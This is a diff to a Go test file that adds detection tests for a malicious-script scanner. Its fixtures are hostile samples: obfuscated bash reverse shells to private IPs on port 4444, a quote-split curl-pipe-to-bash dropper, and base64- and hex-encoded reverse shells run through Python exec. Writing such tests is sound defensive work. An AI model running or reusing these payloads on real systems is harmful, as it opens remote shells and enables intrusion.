@@ -5,6 +5,7 @@ import (
 	"compress/gzip"
 	"context"
 	"encoding/base64"
+	"encoding/hex"
 	"fmt"
 	"strings"
 	"testing"
@@ -257,5 +258,80 @@ curl -s http://192.168.1.50/dropper.sh | bash
 	}
 	if !foundDropper {
 		t.Errorf("expected multi-signal scan to detect Script_Download_And_Execute in decoded stream")
+	}
+}
+
+func TestDecodeAndRescan_ShellDequoteEvasion(t *testing.T) {
+	cfg := config.NewDefaultConfig()
+	ctx := context.Background()
+
+	// 1. Obfuscated reverse shell with empty quotes and backslashes
+	obfRevShell := []byte("#!/bin/bash\nba''sh -i >& /dev/tcp/10.10.14.5/4444 0>&1\n")
+	match, layers := scanner.DecodeAndRescan(ctx, "/tmp/evasive_rev.sh", obfRevShell, nil, cfg, nil)
+	if match == nil {
+		t.Fatalf("expected detection for shell dequoting reverse shell evasion")
+	}
+	if len(layers) == 0 || layers[0] != "dequote" {
+		t.Errorf("expected layer 'dequote', got %v", layers)
+	}
+
+	// 2. Direct heuristics check detects without needing layers
+	directMatches := scanner.CheckAllSuspiciousScriptContent("/tmp/evasive_rev.sh", obfRevShell, nil, cfg)
+	if len(directMatches) == 0 {
+		t.Fatalf("expected direct heuristic detection for evasive bash reverse shell")
+	}
+	foundDirectRev := false
+	for _, m := range directMatches {
+		if m.Name == "Script_Reverse_Shell_Interactive" {
+			foundDirectRev = true
+			break
+		}
+	}
+	if !foundDirectRev {
+		t.Errorf("expected Script_Reverse_Shell_Interactive in direct matches, got %v", directMatches)
+	}
+
+	// 3. Obfuscated dropper pipe: c''u''r''l ... | b\ash
+	obfDropper := []byte("#!/bin/sh\nc''u''r''l -s http://192.168.1.10/payload.sh | b\\ash\n")
+	dropperMatches := scanner.CheckAllSuspiciousScriptContent("/tmp/dropper.sh", obfDropper, nil, cfg)
+	if len(dropperMatches) == 0 {
+		t.Fatalf("expected direct heuristic detection for evasive curl pipe to bash")
+	}
+}
+
+func TestDecodeAndRescan_PythonDynamicB64(t *testing.T) {
+	cfg := config.NewDefaultConfig()
+	ctx := context.Background()
+
+	revShell := "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
+	b64Payload := base64.StdEncoding.EncodeToString([]byte(revShell))
+	pyScript := []byte(fmt.Sprintf("import os\nexec(__import__('base64').b64decode('%s'))\n", b64Payload))
+
+	match, layers := scanner.DecodeAndRescan(ctx, "/tmp/agent.py", pyScript, nil, cfg, nil)
+	if match == nil {
+		t.Fatalf("expected detection for Python inline __import__('base64').b64decode")
+	}
+	if len(layers) == 0 || layers[0] != "base64" {
+		t.Errorf("expected layer 'base64', got %v", layers)
+	}
+	if !strings.Contains(match.Reason, "Script_Reverse_Shell") {
+		t.Errorf("expected decoded payload to trigger Script_Reverse_Shell, got %s", match.Reason)
+	}
+}
+
+func TestDecodeAndRescan_PythonDynamicHex(t *testing.T) {
+	cfg := config.NewDefaultConfig()
+	ctx := context.Background()
+
+	revShell := "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
+	hexPayload := hex.EncodeToString([]byte(revShell))
+	pyScript := []byte(fmt.Sprintf("exec(__import__('binascii').unhexlify('%s'))\n", hexPayload))
+
+	match, layers := scanner.DecodeAndRescan(ctx, "/tmp/hex_agent.py", pyScript, nil, cfg, nil)
+	if match == nil {
+		t.Fatalf("expected detection for Python inline __import__('binascii').unhexlify")
+	}
+	if len(layers) == 0 || layers[0] != "hex" {
+		t.Errorf("expected layer 'hex', got %v", layers)
 	}
 }
